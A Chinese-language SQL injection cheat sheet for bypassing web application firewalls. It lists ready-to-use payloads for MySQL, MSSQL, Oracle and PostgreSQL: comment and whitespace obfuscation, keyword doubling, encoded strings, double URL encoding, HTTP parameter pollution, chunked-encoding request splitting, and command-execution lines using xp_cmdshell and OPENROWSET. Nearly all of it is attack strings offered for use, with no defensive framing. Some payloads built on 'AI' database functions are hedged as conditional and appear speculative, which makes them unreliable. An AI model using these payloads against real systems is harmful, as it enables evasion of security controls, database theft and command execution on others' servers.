## 四、WAF深度绕过方法论

### 4.1 绕过层级模型
```
Layer 1: 编码层（URL/Unicode/Base64/Hex）
Layer 2: 注释层（内联注释/版本注释/垃圾注释/注释拼接）
Layer 3: 空白符层（空格替代/Tab/换行/括号/特殊空白）
Layer 4: 关键字混淆层（大小写/内联注释插字符/等价函数/同义词）
Layer 5: 语法变形层（等价语法重写/CTE/子查询/JSON包装）
Layer 6: 协议层（HPP/分块编码/长content/畸形请求）
Layer 7: 语义层（AI函数包装/向量语义近似/自然语言转SQL）
```

### 4.2 空白符替换大全
```
-- 空格替代字符（各数据库支持情况）
MySQL:  /**/  %09  %0a  %0b  %0c  %0d  %a0  +  /*!*/  /*x*/  ()
MSSQL:  /**/  %09  %0a  %0d  %0b  ()
Oracle: /**/  %0a  %0d  %09  ()  换行  CHR(9)/CHR(10)/CHR(13)
PostgreSQL: /**/  %09  %0a  %0d  --\n

-- 示例
'/**/AND/**/1=1--
'%0aAND%0a1=1--
'%09AND%091=1--
'()AND()1=1--                         (MySQL空括号代替空格)
'/*comment*/AND/*comment*/1=1--
```

### 4.3 注释绕过技术
```sql
-- MySQL版本注释
'/*!UNION*//*!SELECT*/1,2,3--          (MySQL专属，/*!*/之间MySQL执行，其他数据库当注释)
'/*!50000UNION*//*!50000SELECT*/1,2--  (版本号条件执行，MySQL>=5.00.00执行)

-- 随机垃圾注释
'/**/UN/**/ION/**/SEL/**/ECT/**/1,2--  (中间插注释拆分关键字)
'/^!UNION^/SELECT/1,2--                (利用特殊符号当注释)
'/*anything*/AND/*foo*/1=1--

-- MSSQL行内注释
'--\nAND--\n1=1--
';--comment\nEXEC--\nxp_cmdshell--

-- Oracle/+ Hint/ 注释
'/*+ ALL_ROWS */ UNION SELECT 1,2 FROM DUAL--
'/*+ CHOOSE */ UNION SELECT USER FROM DUAL--

-- 注释结尾混淆
'UNION SELECT 1,2,3--+                 (+替代空格)
'UNION SELECT 1,2,3#                   (MySQL#注释)
'UNION SELECT 1,2,3;%00                (空字节截断后续)
```

### 4.4 关键字混淆与等价替换
**AND/OR替换：**
```sql
-- 逻辑运算符
AND  →  &&           (MySQL)
OR   →  ||
NOT  →  !

-- MSSQL/通用
AND  →  %26%26       (URL编码&&)
OR   →  %7c%7c
NOT  →  %21

-- 双关键字抵消
' AND 1=1 AND '1'='1  →  ' AANDND 1=1--   (如果WAF删除AND一次，残留AND)
' UNUNIONION SELECT--  (双写绕过删除型WAF)
```

**UNION/SELECT/FROM替换：**
```sql
-- MySQL内联注释
' /*!50000UNION*/ /*!50000SELECT*/ 1,2--

-- MSSQL变体
' UNION/**/ALL/**/SELECT 1,2--          (UNION ALL替代UNION)
' UNION ALL SELECT DISTINCT 1,2--
' INTO OUTFILE 替代写文件

-- Oracle同义词
' UNION SELECT USER FROM "DUAL"--       (双引号包裹标识符)
' UNION SELECT 1 FROM SYS.DUAL--
' UNION SELECT 1 FROM "SYS"."DUAL"--

-- MySQL 8.0+ TABLE语句替代SELECT * FROM
' UNION TABLE users--
```

**等号/比较符替换：**
```sql
=     →  LIKE                  ' AND 1 LIKE 1--
=     →  BETWEEN..AND..        ' AND 1 BETWEEN 1 AND 1--
=     →  IN (1)                ' AND 1 IN (1)--
=     →  REGEXP '^1$'          ' AND 1 REGEXP '^1$'--
=     →  <> 取反双重否定       ' AND NOT 1<>1--
>     →  NOT BETWEEN 0 AND N   ' AND 1 NOT BETWEEN 0 AND 2--
<     →  BETWEEN 0 AND N-1     ' AND 1 BETWEEN 0 AND 1--
空格+→  GREATEST(1,2)=2        ' AND GREATEST(1,2)=2--
空格<→  LEAST(1,2)=1

-- 科学计数法（绕过数字匹配）
' AND 1=1--           →  ' AND 1e0=1--
' LIMIT 1,1--         →  ' LIMIT 1.0,1.0--
' LIMIT 0,1--         →  ' LIMIT 0x1,0x1--    (十六进制)
```

**逗号绕过：**
```sql
-- UNION中无逗号
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
' UNION SELECT * FROM (SELECT 1)a,(SELECT 2)b,(SELECT 3)c--

-- LIMIT无逗号
' LIMIT 1 OFFSET 0--

-- SUBSTRING无逗号（JOIN法）
' AND (SELECT 1 FROM (SELECT SUBSTR(VERSION(),1,1))a)='5'--

-- MID/SUBSTR参数用JOIN拆
' UNION SELECT 1,2,3 FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
```

### 4.5 字符串/函数混淆
**字符串表示（无引号）：**
```sql
-- MySQL十六进制
' AND 0x41444D494E='ADMIN'--
' AND USER()=0x726F6F74406C6F63616C686F7374--

-- MySQL CHAR()函数
' AND CHAR(65,68,77,73,78)='ADMIN'--
' AND CONCAT(CHAR(65),CHAR(68))='AD'--

-- MSSQL
' AND CHAR(65)+CHAR(68)='AD'--
' AND 0x4144='AD'--

-- Oracle CHR()
' AND CHR(65)||CHR(68)='AD'--

-- PostgreSQL
' AND CHR(65)||CHR(68)='AD'--
' AND E'\x41\x44'='AD'--
```

**函数名变形：**
```sql
-- MySQL
VERSION()         →  @@version / @@global.version / VERSION/**/()
DATABASE()        →  DATABASE/**/() / SCHEMA()
USER()            →  CURRENT_USER / CURRENT_USER() / SYSTEM_USER() / SESSION_USER()
SUBSTRING()       →  MID() / SUBSTR() / LEFT()/RIGHT()
ASCII()           →  ORD() / ASCII()
LENGTH()          →  LENGTH() / CHAR_LENGTH() / OCTET_LENGTH()

-- MSSQL
LEN()             →  DATALENGTH()
GETDATE()         →  SYSDATETIME() / GETUTCDATE()
ISNULL()          →  COALESCE()
SUSER_NAME()      →  SYSTEM_USER / CURRENT_USER / USER_NAME()

-- Oracle
SUBSTR()          →  SUBSTRB() / SUBSTRC() / DBMS_LOB.SUBSTR()
LENGTH()          →  LENGTHB() / DBMS_LOB.GETLENGTH()
```

### 4.6 高级编码绕过
```sql
-- URL多层编码
原始: ' UNION SELECT 1,2--
一层URL: %27%20UNION%20SELECT%201%2c2--
二层URL: %2527%2520UNION%2520SELECT%25201%252c2--
Unicode: %u0027%u0020UNION%u0020SELECT%u00201%u002c2--

-- 双重URL编码绕WAF
%2527  → WAF解码一次得到%27放行 → 后端再次解码得到'

-- HTML实体
&#39; → '   &#x27; → '   &apos; → '

-- Base64/自定义编码（若后端有decoder）
'; DECLARE @a VARCHAR(8000);SET @a=CAST(0x554E494F4E2053454C454354 AS VARCHAR(8000));EXEC(@a)--

-- 双重编码
' AND 1=CONVERT(INT,(SELECT DB_NAME()))--   (MSSQL十六进制编码EXEC)
```

### 4.7 HPP（HTTP参数污染）
```http
?a=1&a=2' AND SLEEP(5)--&a=3
-- WAF可能只取第一个a=1，后端取最后一个或拼接
?id=1&id=1' UNION SELECT 1,2--
?name=admin'/*&pass=*/AND 1=1--            (跨参数注释拼接)
```

### 4.8 协议层绕过
```http
-- Transfer-Encoding: chunked（绕WAF内容检测）
POST /login HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5
UNION
6
 SELEC
4
T 1,
2
2--
0

-- Content-Length溢出/畸形
Content-Length: 0（Content-Length伪造为0，后端读全量）

-- 超长无意义Content-Type前缀
Content-Type: aaaaaaaaaaaa...(2000个a)...application/x-www-form-urlencoded

-- 分块+超长前缀
-- 多Content-Type头
```

### 4.9 分数据库版本高级绕过（ByPassTamperPlus技术）

**MySQL 5.7+ JSON函数混淆：**
```sql
-- INFORMATION_SCHEMA替换为SYS库
' AND (SELECT JSON_EXTRACT(JSON_OBJECT('a',(SELECT GROUP_CONCAT(table_name) FROM sys.schema_table_statistics)),'$.a'))--
' AND (SELECT JSON_EXTRACT(CONCAT(0x7b2261223a,HEX((SELECT GROUP_CONCAT(table_name) FROM sys.schema_table_statistics)),0x7d),0x242e61))--

-- JSON_ARRAYAGG替代GROUP_CONCAT
' AND (SELECT JSON_ARRAYAGG(CONCAT(table_name,0x3a,column_name)) FROM sys.schema_object_overview)--

-- SYS库视图替换INFORMATION_SCHEMA
INFORMATION_SCHEMA.TABLES  →  sys.schema_table_statistics / sys.x$schema_flattened_keys
INFORMATION_SCHEMA.COLUMNS →  sys.schema_object_overview / sys.x$ps_schema_table_statistics_io
```

**MySQL 8.0 CTE+窗口函数语法变形：**
```sql
-- SELECT包装为CTE
' WITH cte AS (SELECT 1,VERSION()) SELECT * FROM cte--

-- SLEEP用窗口函数包装（绕关键字检测）
' AND (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT 1 WHERE 1=1 AND SLEEP(5))))--

-- TABLE语句（MySQL 8.0.19+）
' UNION TABLE information_schema.tables--

-- REGEXP_REPLACE字符串拆分
' AND REGEXP_REPLACE(CONCAT(0x61,0x64),0x61,0x61)='ad'--
```

**MSSQL 2016+ OPENJSON/JSON_VALUE：**
```sql
-- 数据提取用JSON函数包装
' AND (SELECT TOP 1 CAST(JSON_VALUE('{"a":"'+@@version+'"}','$.a') AS INT))--

-- OPENJSON替代传统查询
' AND (SELECT [value] FROM OPENJSON((SELECT * FROM (SELECT 1 a,@@version b)t FOR JSON PATH)))--

-- 2019+ APPROX_COUNT_DISTINCT
' AND APPROX_COUNT_DISTINCT(CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN USER_NAME() END)>0--

-- UTF8排序规则（COLLATE）变形
' AND 1=(SELECT TOP 1 name COLLATE Latin1_General_100_CI_AS_SC_UTF8 FROM sys.columns)--

-- OPENROWSET ODBC命令执行绕过
' AND (SELECT * FROM OPENROWSET('ODBC','Driver={cmd};Command=whoami',''))--
```

**MSSQL 2025（AI_PREDICT/VECTOR_DISTANCE模拟）：**
```sql
-- 利用AI相关函数（若支持）做语义近似比较
' AND VECTOR_DISTANCE(VECTOR_EMBEDDING('admin'),VECTOR_EMBEDDING(username),COSINE)<0.1--
' AND AI_PREDICT('is admin?',username)=1--
```

**Oracle 23ai AI_SQL_GENERATE/VECTOR语义：**
```sql
-- 自然语言生成SQL（若该函数可用）
' AND 1=(SELECT AI_SQL_GENERATE('Show me the current database user') FROM DUAL)--

-- 向量相似度绕过传统等值比较
' AND VECTOR_DISTANCE(VECTOR_EMBEDDING(username),VECTOR_EMBEDDING('ADMIN'),COSINE)<0.1--

-- 双引号标识符包裹
' AND "USER"=(SELECT "USER" FROM "DUAL")--

-- CHR拼接（无引号）
' AND USER=CHR(83)||CHR(89)||CHR(83)--
```

